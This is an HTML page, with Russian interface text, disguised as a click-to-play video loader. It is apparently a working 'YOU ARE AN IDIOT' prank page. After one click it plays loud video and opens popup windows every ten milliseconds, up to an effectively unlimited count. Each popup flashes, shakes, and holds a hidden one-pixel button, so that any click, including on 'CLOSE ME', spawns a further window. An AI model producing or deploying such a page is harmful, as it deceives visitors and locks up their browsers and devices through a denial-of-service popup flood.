<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        html, body {
            margin: 0; padding: 0; height: 100%;
            background: #000; overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #start-screen {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            background: #000; cursor: pointer; z-index: 9999;
        }
        #start-screen h1 { font-size: 22px; color: #fff; margin-bottom: 30px; }
        #green-btn {
            background: #00cc44; color: #fff; border: none;
            padding: 18px 40px; font-size: 20px;
            border-radius: 8px; cursor: pointer;
            box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
        }
        #green-btn:hover { background: #00ff55; }
        #video-container {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1; display: none; background: #000;
        }
        #fullscreen-video { width: 100%; height: 100%; object-fit: cover; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="start-screen" onclick="startVideo()">
        <h1>Загрузка контента...</h1>
        <button id="green-btn" onclick="event.stopPropagation(); startVideo();">
            ▶ Нажми, чтобы показать
        </button>
    </div>

    <div id="video-container">
        <video id="fullscreen-video" loop playsinline>
            <source src="video.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        var started = false;
        var spamCount = 0;
        var MAX_SPAM = 99999999;
        var bigOpened = false;

        function startVideo() {
            if (started) return;
            started = true;

            document.getElementById('start-screen').classList.add('hidden');
            document.getElementById('video-container').style.display = 'block';

            var video = document.getElementById('fullscreen-video');
            video.muted = false;
            video.volume = 1.0;
            video.play().catch(function(e) {
                console.log('Ошибка автоплея:', e);
            });

            tryOpenBigNow();
            setTimeout(startChaos, 1000);
        }

        function tryOpenBigNow() {
            var w = window.open('', '_blank', 'width=600,height=500');
            if (w && !w.closed) {
                bigOpened = true;
                writeBigWindow(w);
            }
        }

        function startChaos() {
            if (!bigOpened) openBigWindow();
            openSmallWindow();
        }

        function openBigWindow() {
            if (bigOpened) return;
            var w = window.open('', '_blank', 'width=600,height=500');
            if (w && !w.closed) {
                bigOpened = true;
                writeBigWindow(w);
            } else {
                setTimeout(openBigWindow, 10);   // ← 0.01 сек
            }
        }

        // ============================================================
        //  МАЛЕНЬКИЕ ОКНА — каждые 0.01 сек
        // ============================================================
        function openSmallWindow() {
            if (spamCount >= MAX_SPAM) return;

            var w2 = window.open('', '_blank', 'width=400,height=350');
            if (w2 && !w2.closed) {
                spamCount++;
                writeSmallWindow(w2, spamCount);
                setTimeout(openSmallWindow, 10);   // ← 0.01 сек
            } else {
                setTimeout(openSmallWindow, 10);   // ← 0.01 сек
            }
        }

        function writeBigWindow(w) {
            try {
                w.document.write(`
                    <html>
                    <head><title>YOU ARE AN IDIOT</title></head>
                    <body style="background:black;color:red;font-family:monospace;
                                 text-align:center;padding-top:50px;overflow:hidden;margin:0;">
                        <h1 style="font-size:60px;animation:blink 0.4s infinite;margin:0;">
                            YOU ARE AN IDIOT
                        </h1>
                        <h2 style="font-size:30px;margin-top:20px;">SURVIVAL FOR THE FITTEST</h2>
                        <button onclick="window.close()" style="font-size:20px;
                                padding:15px 30px;margin-top:30px;
                                background:red;color:white;border:none;
                                cursor:pointer;">CLOSE ME</button>
                        <style>
                            @keyframes blink {
                                0% { color: white; background: black; }
                                50% { color: black; background: white; }
                                100% { color: white; background: black; }
                            }
                            body { animation: shake 0.1s infinite; }
                            @keyframes shake {
                                0% { transform: translate(0,0); }
                                25% { transform: translate(4px,4px); }
                                50% { transform: translate(-4px,-4px); }
                                75% { transform: translate(4px,-4px); }
                                100% { transform: translate(0,0); }
                            }
                        </style>
                    </body>
                    </html>
                `);
            } catch(e) {}
        }

        function writeSmallWindow(w2, num) {
            try {
                w2.document.write(`
                    <html>
                    <head><title>YOU ARE AN IDIOT</title></head>
                    <body style="background:black;color:red;
                                 font-family:monospace;text-align:center;
                                 padding-top:40px;margin:0;overflow:hidden;
                                 cursor:crosshair;">

                        <button id="evil"
                                style="position:fixed;top:0;left:0;
                                       width:1px;height:1px;
                                       padding:0;margin:0;border:none;
                                       background:red;
                                       z-index:999999;
                                       cursor:pointer;
                                       opacity:0.001;">
                        </button>

                        <h1 style="font-size:40px;
                                   animation:blink 0.3s infinite;margin:0;
                                   pointer-events:none;">
                            YOU ARE AN IDIOT
                        </h1>
                        <p style="font-size:18px;pointer-events:none;">#` + num + `</p>
                        <button onclick="window.close()"
                                style="font-size:16px;padding:10px 20px;
                                background:red;color:white;border:none;
                                cursor:pointer;margin-top:20px;
                                position:relative;z-index:10;">
                            CLOSE ME
                        </button>

                        <style>
                            @keyframes blink {
                                0% { color: red; background: black; }
                                50% { color: black; background: red; }
                                100% { color: red; background: black; }
                            }
                            body { animation: shake 0.1s infinite; }
                            @keyframes shake {
                                0% { transform: translate(0,0); }
                                25% { transform: translate(3px,3px); }
                                50% { transform: translate(-3px,-3px); }
                                75% { transform: translate(3px,-3px); }
                                100% { transform: translate(0,0); }
                            }
                        </style>

                        <script>
                            var evil = document.getElementById('evil');
                            var spawnCount = 0;
                            var MAX_SPAWN = 99999999;

                            function userClicked(e) {
                                if (e.target && e.target.id === 'evil') return;
                                try { evil.click(); } catch(err) {}
                            }

                            document.addEventListener('click', userClicked);
                            document.addEventListener('touchstart', userClicked, {passive: true});

                            evil.addEventListener('click', function() {
                                if (spawnCount >= MAX_SPAWN) return;
                                spawnCount++;
                                try {
                                    var extra = window.open('', '_blank', 'width=400,height=350');
                                    if (extra) {
                                        extra.document.write('<html><head><title>YOU ARE AN IDIOT</title></head><body style="background:black;color:red;font-family:monospace;text-align:center;padding-top:40px;margin:0;"><h1 style="font-size:40px;animation:blink 0.3s infinite;">YOU ARE AN IDIOT</h1><p>#SPAWN ' + spawnCount + '</p><button onclick="window.close()" style="font-size:16px;padding:10px 20px;background:red;color:white;border:none;cursor:pointer;margin-top:20px;">CLOSE ME</button><style>@keyframes blink{0%{color:red;background:black}50%{color:black;background:red}100%{color:red;background:black}}</style></body></html>');
                                    }
                                } catch(e) {}
                            });
                        <\/script>
                    </body>
                    </html>
                `);
            } catch(e) {}
        }

        function stopSpam() {
            spamCount = MAX_SPAM;
        }
    </script>
</body>
</html>
